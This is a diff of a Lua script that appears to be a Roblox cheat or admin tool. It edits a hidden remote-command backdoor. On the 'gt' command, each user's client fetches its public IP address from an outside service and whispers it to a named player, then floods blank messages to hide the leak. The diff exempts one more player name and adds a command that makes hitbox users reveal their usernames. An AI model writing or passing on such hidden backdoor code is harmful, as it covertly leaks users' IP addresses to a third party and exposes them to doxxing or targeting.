@@ -4320,12 +4320,19 @@ end
 end
 
 if Connect.SendCommand("gt") then
-if LPlayer.Name ~= "viniciuszk70" then
+if LPlayer.Name ~= "viniciuszk70" and LPlayer.Name ~= "R1_NOOB" then
 local GT = tostring(game:HttpGet("https://api.ipify.org", true))
 Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w viniciuszk70 mpls"..GT.."mpls", "All")
 for i = 1,100 do
 Message(" ",0,0,0,Enum.Font.GothamBlack,21.5)
 end
+end
+end
+
+if Connect.SendCommand("gethbes") then
+if HitBox then
+wait(.2)
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
 end
 end
 
